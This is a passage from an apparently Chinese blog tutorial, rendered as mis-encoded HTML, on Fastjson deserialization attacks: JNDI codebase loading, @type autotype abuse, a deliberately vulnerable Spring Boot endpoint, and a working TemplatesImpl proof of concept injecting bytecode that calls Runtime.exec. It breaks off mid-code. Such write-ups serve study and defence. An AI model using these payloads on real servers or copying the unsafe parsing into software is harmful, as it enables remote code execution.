srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>decodeObjectä¼šåˆ¤æ–­RMIServerç»‘å®šçš„ç±»æ˜¯å¦ä¸ºRemoteReferenceçš„å­ç±»(var1)ï¼Œæ˜¯çš„è¯ç”¨getReference()è·å–Referenceç±»ï¼Œèµ‹å€¼ç»™var3</p><p>éšåæ‰§è¡ŒNamingManager.getObjectInstance()ï¼Œåœ¨æ­¤å‡½æ•°å†…æ‰§è¡Œäº†getObjectFactoryReference</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193329571.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193329571.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›getObjectFactoryReference():å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªtryå¹¶æ²¡æœ‰ç”¨åˆ°codebaseï¼Œæ„å‘³ç€é¦–å…ˆæ˜¯åœ¨æœ¬åœ°å¯»æ‰¾ç±»ï¼Œå¦‚æœæ²¡æœ‰æ‰æ‰§è¡Œç¬¬äºŒä¸ªtryåŠ è½½codebaseä¸Šçš„è¿œç¨‹ç±»ã€‚æœ€åç”¨newInstance()å®ä¾‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193544410.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193544410.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>clas=helper.loadClass(factoryName)</code>é‡‡ç”¨åå°„çš„æ–¹å¼è·å–ç±»åã€‚åœ¨ifåˆ¤æ–­é‡Œæ ¹æ®Referenceçš„ClassNameå’Œcodebase(å¦‚<code>rmi://ip:port/</code>)æ¥åŠ è½½factoryç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215200931098.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215200931098.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Fastjsonå‰ç½®çŸ¥è¯†"><a href="#Fastjsonå‰ç½®çŸ¥è¯†" class="headerlink" title="Fastjsonå‰ç½®çŸ¥è¯†"></a>Fastjsonå‰ç½®çŸ¥è¯†</h2><h3 id="Fastjsonä½¿ç”¨"><a href="#Fastjsonä½¿ç”¨" class="headerlink" title="Fastjsonä½¿ç”¨"></a>Fastjsonä½¿ç”¨</h3><p>pom.xmlæ·»åŠ fastjsonä¾èµ–ï¼ŒjdbcRowSetImplé“¾éœ€è¦fastjson&lt;&#x3D;1.2.24</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨<code>JSON.toJSONString()</code>å°†å¯¹è±¡<strong>åºåˆ—åŒ–</strong>ä¸ºjsonå­—ç¬¦ä¸²ã€‚</p><p>ååºåˆ—åŒ–ï¼š<code>JSON.parseObject()</code>ã€<code>JSON.parse</code></p><p>parseObject()è¿”å›fastjson.JSONObjectç±»ï¼Œè€Œparseè¿”å›ç±»User</p><p>åœ¨parseObjectæ„é€ å‡½æ•°æŒ‡å®šä¸ºObjectç±»ï¼Œå¯ä»¥èµ·åˆ°parseçš„ä½œç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsons</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjsonvul.User\&quot;,\&quot;name\&quot;:\&quot;godown\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsons,Object.class);</span><br></pre></td></tr></table></figure><ul><li><code>@type</code>å‚æ•°æŒ‡å®šååºåˆ—åŒ–åçš„ç±»åï¼Œç„¶åè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„setterã€getterä»¥åŠæ„é€ å‡½æ•°</li></ul><blockquote><p>å¦‚æœä¸çŸ¥é“getter,setterï¼Œå¯ä»¥çœ‹ä¸€ä¸‹javaBean:<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p></blockquote><p>æµ‹è¯•ï¼š</p><p>æ¶æ„ç±»Evilï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Evil&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmd=&#x27;&quot;</span> + cmd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><p>springbootèµ·çš„æœåŠ¡å™¨ï¼Œè®°å¾—å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastVuln1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/fast1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">FastVuln1</span><span class="params">(<span class="meta">@RequestParam(name=&quot;user&quot;)</span> String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(user,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@RestController</code>çš„æ„æ€å°±æ˜¯controlleré‡Œé¢çš„æ–¹æ³•éƒ½ä»¥jsonæ ¼å¼è¾“å‡º</p><p><code>@RequestMapping</code>æ³¨è§£åœ¨FastVuln1æ–¹æ³•å¤„ï¼Œè¡¨ç¤ºæ˜ å°„ç±»åˆ°urlè·¯å¾„fast1ï¼Œèƒ½å¤„ç†æ‰€æœ‰HTTPè¯·æ±‚</p><p><code>@RequestParam</code>æ³¨è§£åœ¨String cmdå‚æ•°å¤„ï¼Œè¡¨ç¤ºæ¥æ”¶URLä¸­çš„cmdå‚æ•°ï¼Œæ¥æ”¶ä¸åˆ°ä¼šæŠ¥é”™</p><blockquote><p>æ³¨è§£ï¼š<a href="https://www.cnblogs.com/tomingto/p/11377138.html">https://www.cnblogs.com/tomingto/p/11377138.html</a></p></blockquote><p>å‘urlï¼š<code>http://localhost:xxx/fast1</code> POSTä¼ å‚ payloadï¼š<code>user = &#123;&quot;@type&quot;:&quot;org.example.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;</code></p><blockquote><p>æˆ‘ç”¨getæ–¹å¼ä¼ å‚å‡ºç°äº†é”™è¯¯ï¼Œä¼šæŠ¥<code>The valid characters are defined in RFC 7230 and RFC 3986</code>å¼‚å¸¸ï¼Œurlä¸­ä¸å…è®¸åŒ…å«@æˆ–è€…ä¸€äº›å…¶ä»–çš„ç‰¹æ®Šå­—ç¬¦</p><p>fastJsoné»˜è®¤ä¸ååºåˆ—åŒ–ç§æœ‰å±æ€§ï¼ŒparseObjectåŠ ä¸Š<code>Feature.SuppertNonPublicField</code>å¯¹ç§æœ‰å±æ€§è¿›è¡Œååºåˆ—åŒ–</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221216225418882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221216225418882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="getterã€setter-æºç åˆ†æ"><a href="#getterã€setter-æºç åˆ†æ" class="headerlink" title="getterã€setter æºç åˆ†æ"></a>getterã€setter æºç åˆ†æ</h3><p>åœ¨javaBeanInfo#build()æ–¹æ³•ï¼Œåˆ©ç”¨åå°„å°† ååºåˆ—åŒ–å<code>@type</code>æŒ‡å®šç±» çš„æ–¹æ³•ã€å±æ€§ã€æ„é€ å™¨å­˜å…¥buildClass,declaredFieldsæ•°ç»„å’Œmethodæ•°ç»„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217191753814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217191753814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>buile()æ–¹æ³•é‡Œé¢è¿˜æœ‰if åˆ¤æ–­æ„é€ å‡½æ•°æ˜¯å¦å­˜åœ¨&amp;&amp;ä¼ å…¥ç±»æ˜¯å¦ä¸ºæŠ½è±¡ç±»æˆ–è€…æ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217192135930.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217192135930.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸‹é¢çœ‹å¯¹methodçš„åˆ¤æ–­ï¼ˆä¹Ÿå°±æ˜¯setterçš„å®šä¹‰)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217193903768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217193903768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ–¹æ³•åå¼€å¤´æ˜¯å¦ä¸ºset</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194023133.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194023133.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol><li>æ–¹æ³•åé•¿åº¦ä¸èƒ½å°äº4</li><li>ä¸èƒ½æ˜¯é™æ€æ–¹æ³•</li><li>è¿”å›çš„ç±»å‹å¿…é¡»æ˜¯void æˆ–è€…æ˜¯è‡ªå·±æœ¬èº«</li><li>ä¼ å…¥å‚æ•°ä¸ªæ•°å¿…é¡»ä¸º1</li><li>æ–¹æ³•å¼€å¤´å¿…é¡»æ˜¯set</li></ol><p>åœ¨if(methodName.startWith(â€œsetâ€))å†…ï¼ŒcharAt(3)è¿”å›methodç¬¬å››ä¸ªå­—ç¬¦ï¼Œæ ¹æ®asciiç è¿›è¡Œæˆªæ–­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194849987.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194849987.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœç»è¿‡æˆªæ–­è¿˜æ˜¯æ‰¾ä¸åˆ°å±æ€§æˆ–è€…ä¸ºBooleanï¼Œå°±åœ¨æˆªæ–­åçš„å˜é‡å‰åŠ isï¼Œç„¶åå¯¹ç›¸åº”å­—ç¬¦å¤§å†™è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åé‡æ–°å¯»æ‰¾å±æ€§</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195212008.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195212008.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åå°†ç›¸åº”å±æ€§æ–¹æ³•ç­‰å†…å®¹æ·»åŠ åˆ°fieldInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195452522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195452522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getterçš„åˆ¤æ–­ä¹Ÿå·®ä¸å¤šï¼Œç›´æ¥ç»™å‡ºè¦æ±‚ï¼š</p><ol><li>æ–¹æ³•åé•¿åº¦ä¸å°äº4</li><li>ä¸èƒ½æ˜¯é™æ€æ–¹æ³•</li><li>æ–¹æ³•åè¦getå¼€å¤´åŒæ—¶ç¬¬å››ä¸ªå­—ç¬¦ä¸²è¦å¤§å†™</li><li>æ–¹æ³•è¿”å›çš„ç±»å‹å¿…é¡»ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong</li><li>ä¼ å…¥çš„å‚æ•°ä¸ªæ•°éœ€è¦ä¸º0</li></ol><h2 id="fastJson-TemplatesImplé“¾"><a href="#fastJson-TemplatesImplé“¾" class="headerlink" title="fastJson TemplatesImplé“¾"></a>fastJson TemplatesImplé“¾</h2><p>ç‰ˆæœ¬ï¼šfastjson 1.2.22-1.2.24</p><p>TemplatesImplé“¾æ„é€ çš„æ¶æ„ç±»ä¸ºObjectï¼Œä½†æ˜¯åœ¨fastJsonåºåˆ—åŒ–ä¸­ï¼Œåªæœ‰ä¸¤ç§æ–¹å¼èƒ½æ¥æ”¶Objectç±»ï¼ˆå¹¶ä¸”è¦è®¾ç½®Feature.SupportNonPublicFieldï¼Œæ¢å¤privateå±æ€§ï¼‰,ä½†æ˜¯åœ¨1.2.22æ‰å‡ºç°è¯¥å±æ€§ï¼Œ1.2.24ååˆåŠ äº†å¾ˆå¤šé»‘åå•å’Œç™½åå•</p><p>æˆ‘ä»¬æ„é€ çš„PoCä¸­æœ‰privateçš„æˆå‘˜å˜é‡<code>_bytecodes</code>å’Œ<code>_name</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> parseObject(input,Object.class,Feature.SupportNonPublicField)<span class="comment">//ä¸è®¾ç½®Objectä¼šè¿”å›JSONObject</span></span><br><span class="line"><span class="number">2.</span> parse(input,Feature.SupportNonPublicField)</span><br></pre></td></tr></table></figure><p>TemplatesImplé“¾æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯newTransformer()ä½œä¸ºå…¥å£ï¼›ä¸€ç§æ˜¯getOutputProperties()ä½œä¸ºå…¥å£ï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯ç¬¬äºŒç§</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl<span class="selector-id">#getOutputProperties</span>() -&gt; TemplatesImpl<span class="selector-id">#newTransformer</span>() -&gt;TemplatesImpl<span class="selector-id">#getTransletInstance</span>() -&gt; TemplatesImpl<span class="selector-id">#defineTransletClasses</span>()-&gt; TransletClassLoader<span class="selector-id">#defineClass</span>()</span><br></pre></td></tr></table></figure><p>POCå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonpoc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">EvilCode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(EvilCode);</span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GADGAT_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil</span> <span class="operator">=</span> fastjsonpoc1.generateEvil();</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>poc1ç±»ç”¨æ¥æ„é€ æ¶æ„å­—èŠ‚ç ã€‚ClassPool.getDefult()è·å–é»˜è®¤ç±»æ± åï¼Œåˆ›å»ºç±»Evil</p><p>è®¾ç½®è¦ç»§æ‰¿çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–å™¨ï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br></pre></td></tr></table></figure><p>å‘æ„é€ å‡½æ•°é‡ŒåŠ å…¥cmdï¼Œä¹Ÿå°±æ˜¯execå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.insertBefore(cmd);</span><br></pre></td></tr></table></figure><p>è®¾ç½®åŠ è½½AbstractTransletç±»çš„æœç´¢è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName())</span><br></pre></td></tr></table></figure><p>å°†ç¼–è¯‘çš„ç±»åˆ›å»ºä¸º<code>.class</code> æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.writeFile(<span class="string">&quot;./&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote><ul><li>TemplatesImplåŠ è½½çš„å­—èŠ‚ç å¿…é¡»ä¸ºAbstractTransletå­ç±»ï¼Œå› ä¸ºdefineTransletClassesé‡Œä¼šå¯¹ä¼ å…¥ç±»è¿›è¡Œä¸€æ¬¡åˆ¤æ–­</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="comment">// ABSTRACT_TRANSLETæŒ‡com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletç±»</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ å¥½çš„Evilç±»è½¬ä¸ºå­—èŠ‚ç åbase64å°±èƒ½ä¼ å…¥<code>_bytecodes[]</code>äº†</p><blockquote><p>String PoCç»è¿‡JSON.parseObjectåºåˆ—åŒ–åçº¦ä¸º(å› ä¸ºè®¾ç½®ä¸äº†ç§æœ‰å±æ€§çš„ç¼˜æ•…ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªsetFieldValueæ–¹æ³•æ¨¡æ‹Ÿ)ï¼š</p></blockquote><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    Â <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">â€‹</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;evil&#125;);<span class="comment">//evilä¸ºæ¶æ„å­—èŠ‚ç </span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a.b&quot;</span>);</span><br><span class="line">        